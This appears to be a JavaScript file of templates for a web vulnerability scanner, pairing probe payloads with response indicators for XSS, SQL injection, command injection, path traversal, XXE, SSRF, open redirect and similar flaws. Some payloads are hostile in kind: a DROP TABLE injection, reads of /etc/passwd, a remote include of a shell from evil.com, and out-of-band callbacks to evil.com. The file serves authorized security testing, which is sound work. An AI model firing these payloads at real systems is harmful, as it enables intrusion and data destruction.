/**
 * web.js - extended test templates (placeholders)
 *
 * Warning:
 * - This file contains many test templates. Dangerous payloads are left as placeholders.
 * - Use only in authorized tests and isolated environments.
 *
 * Entry structure:
 * {
 *   title: "Short title",
 *   method: "GET" | "POST" | "HEAD" (optional, default "GET"),
 *   paramLocation: "query" | "body" | "path" | "header" | "cookie" | "fragment" | "none" (optional),
 *   header: "Header-Name" (optional),
 *   params: [ "payload1", "payload2", ... ],
 *   detectResponses: [ "indicator1", "indicator2", ... ],
 *   tags: [ "tag1", "tag2" ],
 *   critLevel: 1..3
 * }
 */

export const web = [
  /* XSS: Reflected */
  {
    title: "XSS: Reflected - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "<script>alert(1)</script>",
      "'><script>alert(2)</script>"
    ],
    detectResponses: [
      "alert(1)",
      "alert(2)"
    ],
    tags: ["xss", "reflected", "get-param"],
    critLevel: 2
  },

  /* XSS: Stored */
  {
    title: "XSS: Stored - Template",
    method: "POST",
    paramLocation: "body",
    params: [
      "<script>alert(3)</script>"
    ],
    detectResponses: [
      "alert(3)"
    ],
    tags: ["xss", "stored", "post-body"],
    critLevel: 3
  },

  /* XSS: DOM-based */
  {
    title: "XSS: DOM-based - Template",
    method: "GET",
    paramLocation: "fragment",
    params: [
      "<script>alert(4)</script>"
    ],
    detectResponses: [
      "alert(4)"
    ],
    tags: ["xss", "dom"],
    critLevel: 2
  },

  /* SQLi: Error-based */
  {
    title: "SQLi: Error-based Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "' OR '1'='1",
      "'; DROP TABLE users;"
    ],
    detectResponses: [
      "syntax error",
      "database error",
      "You have an error in your SQL syntax"
    ],
    tags: ["sqli", "error-based", "get-param"],
    critLevel: 3
  },

  /* SQLi: Union / Boolean */
  {
    title: "SQLi: Union/Boolean Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "' UNION SELECT NULL,NULL--",
      "' AND '1'='1"
    ],
    detectResponses: [
      "Union result",
      "True indicator"
    ],
    tags: ["sqli", "union", "boolean"],
    critLevel: 3
  },

  /* SQLi: Time-based / Blind */
  {
    title: "SQLi: Time-based / Blind Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "' OR SLEEP(5)--"
    ],
    detectResponses: [
      "Time delay detected"
    ],
    tags: ["sqli", "time-based", "blind"],
    critLevel: 3
  },

  /* SQLi: Header / Cookie */
  {
    title: "SQLi: Header / Cookie Template",
    method: "GET",
    paramLocation: "header",
    header: "Cookie",
    params: [
      "id=1; user=' OR '1'='1"
    ],
    detectResponses: [
      "syntax error",
      "You have an error in your SQL syntax"
    ],
    tags: ["sqli", "header-fuzz"],
    critLevel: 3
  },

  /* OS Command Injection */
  {
    title: "OS Command Injection - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "; ls -la"
    ],
    detectResponses: [
      "total ",
      "-rw-r--r--"  // Example of file permissions
    ],
    tags: ["os-command", "injection"],
    critLevel: 3
  },

  /* Path Traversal / LFI */
  {
    title: "Path Traversal / LFI - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "../../../../etc/passwd",
      "../etc/passwd"
    ],
    detectResponses: [
      "root:x:0:0",
      "/etc/passwd content"
    ],
    tags: ["lfi", "path-traversal"],
    critLevel: 3
  },

  /* RFI: Remote File Inclusion */
  {
    title: "RFI: Remote File Inclusion - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "http://evil.com/shell.php"
    ],
    detectResponses: [
      "Remote file included"
    ],
    tags: ["rfi", "remote-include"],
    critLevel: 3
  },

  /* SSRF */
  {
    title: "SSRF: Server-Side Request Forgery - Template",
    method: "POST",
    paramLocation: "body",
    params: [
      "http://internal-server/api"
    ],
    detectResponses: [
      "Internal API response"
    ],
    tags: ["ssrf", "internal"],
    critLevel: 3
  },

  /* XXE */
  {
    title: "XXE: XML External Entity - Template",
    method: "POST",
    paramLocation: "body",
    params: [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root>&xxe;</root>'
    ],
    detectResponses: [
      "root:x:0:0"
    ],
    tags: ["xxe", "xml"],
    critLevel: 3
  },

  /* SSTI */
  {
    title: "SSTI: Template Injection - Template",
    method: "POST",
    paramLocation: "body",
    params: [
      "{{7*7}}"
    ],
    detectResponses: [
      "49"
    ],
    tags: ["ssti", "template"],
    critLevel: 3
  },

  /* Insecure Deserialization */
  {
    title: "Insecure Deserialization - Template",
    method: "POST",
    paramLocation: "body",
    params: [
      'O:8:"stdClass":1:{s:5:"test";s:5:"value";}'
    ],
    detectResponses: [
      "Deserialization exception"
    ],
    tags: ["deserialization", "object"],
    critLevel: 3
  },

  /* Open Redirect */
  {
    title: "Open Redirect - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      "http://evil.com"
    ],
    detectResponses: [
      "Location: http://evil.com",
      "Redirect URL indicator"
    ],
    tags: ["open-redirect", "redirect"],
    critLevel: 1
  },

  /* CSRF token missing */
  {
    title: "CSRF: Anti-CSRF Token Missing - Template",
    method: "POST",
    paramLocation: "body",
    params: [
      'csrf_token='
    ],
    detectResponses: [
      "CSRF bypass indicator"
    ],
    tags: ["csrf", "auth"],
    critLevel: 3
  },

  /* CORS misconfiguration */
  {
    title: "CORS: Wildcard or Insecure Origin - Template",
    method: "OPTIONS",
    paramLocation: "header",
    header: "Origin",
    params: [
      "http://evil.com"
    ],
    detectResponses: [
      "Access-Control-Allow-Origin",
      "*",
      "Allowed origin indicator"
    ],
    tags: ["cors", "security"],
    critLevel: 2
  },

  /* IDOR */
  {
    title: "IDOR: Insecure Direct Object Reference - Template",
    method: "GET",
    paramLocation: "path",
    params: [
      "1",
      "2"
    ],
    detectResponses: [
      "Sensitive data indicator"
    ],
    tags: ["idor", "auth"],
    critLevel: 3
  },

  /* Auth default credentials */
  {
    title: "Auth Bypass: Common Default Credentials - Template",
    method: "POST",
    paramLocation: "body",
    params: [
      'username=admin&password=admin'
    ],
    detectResponses: [
      "Login successful",
      "sessionid",
      "Auth success indicator"
    ],
    tags: ["auth", "credentials"],
    critLevel: 2
  },

  /* HTTP Header Injection / Response Splitting */
  {
    title: "HTTP Header Injection / Response Splitting - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      'param=value\r\nSet-Cookie: test=1'
    ],
    detectResponses: [
      "Set-Cookie:",
      "HTTP/1.1 200 OK",
      "Split header indicator"
    ],
    tags: ["header-injection", "response-splitting"],
    critLevel: 3
  },

  /* HTTP Parameter Pollution */
  {
    title: "HTTP Parameter Pollution - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      'id=1&id=2'
    ],
    detectResponses: [
      "HPP effect indicator"
    ],
    tags: ["hpp", "parameter"],
    critLevel: 2
  },

  /* Rate limiting / DoS header */
  {
    title: "Rate Limit / Throttling - Template",
    method: "GET",
    paramLocation: "query",
    params: [
      'token=test'
    ],
    detectResponses: [
      "429 Too Many Requests",
      "Rate limit header"
    ],
    tags: ["rate-limit", "dos"],
    critLevel: 2
  },

  /* Security headers checks */
  {
    title: "Security Headers: Missing HttpOnly / Secure on Cookies - Template",
    method: "GET",
    paramLocation: "none",
    params: [
      'cookie=test'
    ],
    detectResponses: [
      "Set-Cookie:",
      "HttpOnly absence indicator"
    ],
    tags: ["headers", "cookie"],
    critLevel: 1
  },
  {
    title: "Security Headers: Missing CSP - Template",
    method: "GET",
    paramLocation: "none",
    params: [
      'csp=test'
    ],
    detectResponses: [
      "Content-Security-Policy",
      "CSP missing indicator"
    ],
    tags: ["headers", "csp"],
    critLevel: 1
  },

  /* Directory indexing / info leak */
  {
    title: "Directory Indexing / Info Leak - Template",
    method: "GET",
    paramLocation: "path",
    params: [
      "/",
      "/.git/",
      "/robots.txt"
    ],
    detectResponses: [
      "Index of /",
      "Sitemap",
      "Disallow:"
    ],
    tags: ["discovery", "info-leak"],
    critLevel: 1
  },

  /* Fingerprinting */
  {
    title: "Fingerprint: Server / Tech Stack - Template",
    method: "HEAD",
    paramLocation: "none",
    params: [
      'fingerprint=test'
    ],
    detectResponses: [
      "Server:",
      "X-Powered-By:"
    ],
    tags: ["fingerprint", "recon"],
    critLevel: 1
  },

  /* OOB / Out-of-band callback */
  {
    title: "OOB: External Callback / Out-of-Band Interaction Template",
    method: "POST",
    paramLocation: "body",
    params: [
      'callback=http://evil.com/callback'
    ],
    detectResponses: [
      "OOB indicator placeholder"
    ],
    tags: ["oob", "out-of-band"],
    critLevel: 3
  }
];